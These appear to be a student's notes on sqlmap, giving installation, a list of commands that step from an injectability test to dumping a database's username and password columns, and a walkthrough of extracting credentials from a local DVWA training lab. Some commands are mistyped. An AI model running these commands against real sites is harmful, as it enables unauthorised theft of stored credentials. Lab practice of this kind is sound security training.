
## sqlmap

## home page:
http://sqlmap.org/

## Introduction:
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

## Download:
you can download sqlmap by cloning the Git repository:
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## commonly used commands:
sqlmap -u  "url"   //test if the url is injectable with the test level 1  

sqlmap -u  "url"  –dbms mysql –level 3   //destinate that the database is mysql with the test level 3  

sqlmap -u  "url"  –cookie “your cookie” –level 2   //inject with cookie  

sqlmap -u  "url"  –dbms mysql –level 3 –dbs    //search the name of the databases  

sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" –tables   //search the tables in this database  

sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" -T "name of table" –columns    //search the columns in this table  

sqlmap -u  "url"  –dbms mysql –level 3 -D "name of database" -T "name of table" –C “username,password” –dump  

//dump the data of the column "username" and "password"  


see more you can visit http://www.vuln.cn/1992

## attack dvwa with sql map:
first we try with  

```
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"   

```
it doesn't work and the dvwa jump to the homepage, so we need to add the coockie  

```
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"  
cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7" 
```
sqlmap shows that the url is injectable and after several tests we use the command below to get the username and password.  

```
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"   
--cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7"--batch -D dvwa -T users -C user,password --dump
```
